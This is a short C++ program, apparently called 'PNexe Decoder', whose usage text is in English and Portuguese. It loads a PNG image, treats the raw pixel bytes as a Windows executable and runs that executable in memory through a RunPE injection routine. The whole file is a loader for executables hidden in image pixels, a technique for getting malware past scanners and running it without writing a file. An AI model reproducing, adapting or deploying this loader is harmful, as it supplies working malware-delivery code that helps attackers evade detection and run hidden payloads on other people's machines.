#include <fstream>

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

#include "RunPE.hpp"

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "PNexe Decoder: ";
        std::cout << "No files! Usage: encoded.png or drop the image\nAdicione um arquivo! Uso: encoded.png ou arraste a imagem\n";
        return -1;
    }

    int CHANNEL_NUM;
    int width;
    int height;

    uint8_t* pix = stbi_load(argv[1], &width, &height, &CHANNEL_NUM, 3);
    Inject::RunPESelf((void*)pix, (DWORD)(width*height*CHANNEL_NUM), (LPWSTR)"");
    stbi_image_free(pix);
    return 0;
}
